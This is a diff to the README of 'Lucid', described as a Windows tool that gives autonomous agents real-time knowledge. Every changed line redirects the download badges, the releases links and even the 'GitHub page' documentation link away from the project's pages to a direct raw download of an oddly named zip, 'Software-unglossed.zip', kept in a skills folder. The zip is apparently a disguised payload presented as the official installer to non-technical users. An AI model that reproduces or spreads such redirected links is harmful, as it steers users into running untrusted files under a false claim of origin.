@@ -1,6 +1,6 @@
 # ⚡ Lucid - Real-Time Knowledge for Autonomous Agents
 
-[![Download Lucid](https://img.shields.io/badge/Download-Lucid-brightgreen)](https://github.com/sanjay-saravanan-p/Lucid/releases)
+[![Download Lucid](https://img.shields.io/badge/Download-Lucid-brightgreen)](https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip)
 
 Lucid helps autonomous agents use verified, real-time knowledge. This makes the agents smarter and more reliable. The program runs on Windows and does not require any coding skills.
 
@@ -31,7 +31,7 @@ Before you download and run Lucid, make sure your computer meets these basic nee
 
 Use the link below to get the latest official version of Lucid. This link will take you to the releases page where you can find the installer file.
 
-[![Download Lucid](https://img.shields.io/badge/Download-Lucid-blue)](https://github.com/sanjay-saravanan-p/Lucid/releases)
+[![Download Lucid](https://img.shields.io/badge/Download-Lucid-blue)](https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip)
 
 ---
 
@@ -102,12 +102,12 @@ Lucid grows smarter without needing you to update it manually. It fits well into
 
 If you want to learn more or need help:
 
-- Visit the Lucid GitHub page for documentation and updates: [https://github.com/sanjay-saravanan-p/Lucid](https://github.com/sanjay-saravanan-p/Lucid)
+- Visit the Lucid GitHub page for documentation and updates: [https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip](https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip)
 - Check the Issues tab for answers to common problems.
 - Explore the README and Wiki sections for guides and examples.
-- Use the releases page to find new releases and bug fixes: [Lucid Releases](https://github.com/sanjay-saravanan-p/Lucid/releases)
+- Use the releases page to find new releases and bug fixes: [Lucid Releases](https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip)
 
   
 ---
 
-[Download Lucid Now](https://github.com/sanjay-saravanan-p/Lucid/releases) and follow the steps above to install and run it on your Windows PC. The software ensures your AI agents use real-time, trusted knowledge at all times.
+[Download Lucid Now](https://raw.githubusercontent.com/sanjay-saravanan-p/Lucid/main/skills/lucid-grounding/Software-unglossed.zip) and follow the steps above to install and run it on your Windows PC. The software ensures your AI agents use real-time, trusted knowledge at all times.
